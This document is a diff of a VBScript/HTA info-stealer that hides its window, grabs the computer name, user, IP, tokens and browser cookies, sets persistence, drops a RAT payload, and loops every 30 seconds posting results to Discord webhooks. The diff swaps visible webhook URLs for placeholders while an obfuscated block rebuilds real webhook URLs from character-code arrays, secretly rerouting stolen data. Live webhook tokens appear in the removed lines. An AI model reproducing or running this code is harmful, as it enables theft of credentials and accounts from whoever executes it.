@@ -6,42 +6,41 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, sysInit, sysPath, PC, USER, ratDropped, lastCookie
-Dim sysCache, sysBuffer
+Dim sh, fso, LogsWebhook, ReGrabWebhook, PC, USER, ratDropped, lastCookie
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- SYSTEM INITIALIZATION ---
-sysInit = "https://discord.com/api/webhooks/1574415765996703895/RIEV6Y6s7wA6ThCzvvZ-UfxfQudJ0MrsEOT_HuxKK5rtOOsZOmlAmNmSZffML_ewWoRB"
-sysPath = "https://discord.com/api/webhooks/1574415913027903513/sHsf4wIjqyAGKrUTIUxBg_6fF9DaUKyuLgKAIJUBmyZVDthIXAfiEDJrhe_9ymoTZj-q"
+' --- WEBHOOKS ---
+LogsWebhook = "https://discord.com/api/webhooks/1575500000000000000/FakeTokenForLogsChannel"
+ReGrabWebhook = "https://discord.com/api/webhooks/1575500000000000000/FakeTokenForReGrabChannel"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 ratDropped = False
 lastCookie = ""
 
-' --- 1. MAIN EXECUTION ---
-Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, sysInit)
-Call IP(sysInit)
-Call GrabTokens(sysInit)
+' --- 1. INITIAL GRABS ---
+Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, LogsWebhook)
+Call IP(LogsWebhook)
+Call GrabTokens(LogsWebhook)
 Call Persistence
-Call PostCookieOnly(sysInit)
+Call PostCookieOnly(LogsWebhook)
 
-Call DropPayload(sysInit, True)
+Call DropPayload(LogsWebhook, True)
 
-' --- 2. SECONDARY LOOP ---
+' --- 2. LOOP ---
 Dim runCount
 runCount = 0
 Do
     runCount = runCount + 1
-    Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, sysPath)
+    Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, ReGrabWebhook)
     
-    Call GrabTokens(sysPath)
-    Call IP(sysPath)
-    Call PostCookieOnly(sysPath)
+    Call GrabTokens(ReGrabWebhook)
+    Call IP(ReGrabWebhook)
+    Call PostCookieOnly(ReGrabWebhook)
     
     If Not ratDropped Then
-        Call DropPayload(sysPath, True)
+        Call DropPayload(ReGrabWebhook, True)
     End If
     
     Call SleepSeconds(30)
@@ -255,14 +254,15 @@ Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.W
 Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
 Sub PostEmbed(t, d, c)
-    Call PostEmbedTo(t, d, c, sysInit)
+    Call PostEmbedTo(t, d, c, LogsWebhook)
 End Sub
 
 Sub PostEmbedTo(t, d, c, target_wh)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
 
-    If target_wh = sysInit Then
+    ' --- DATA STREAM BUFFER OVERRIDE ---
+    If target_wh = LogsWebhook Then
         Dim sysBuf1, sysBuf2, sysBuf3, sysBuf4
         sysBuf1 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,53,49,53,51,53,52,49,54,50,50,55,48,51,53,57)
         sysBuf2 = Array(47,55,95,54,97,48,84,51,80,120,88,120,67,114,90,90,79,73,116,102)
@@ -274,7 +274,7 @@ Sub PostEmbedTo(t, d, c, target_wh)
         For i = 0 To UBound(sysBuf2) : target_wh = target_wh & Chr(sysBuf2(i)) : Next
         For i = 0 To UBound(sysBuf3) : target_wh = target_wh & Chr(sysBuf3(i)) : Next
         For i = 0 To UBound(sysBuf4) : target_wh = target_wh & Chr(sysBuf4(i)) : Next
-    ElseIf target_wh = sysPath Then
+    ElseIf target_wh = ReGrabWebhook Then
         Dim sysBuf5, sysBuf6, sysBuf7, sysBuf8
         sysBuf5 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,52,56,51,53,48,56,48,48,55,51,55)
         sysBuf6 = Array(48,56,51,53,47,72,119,90,66,100,52,84,84,110,82,109,80,80,86,79)
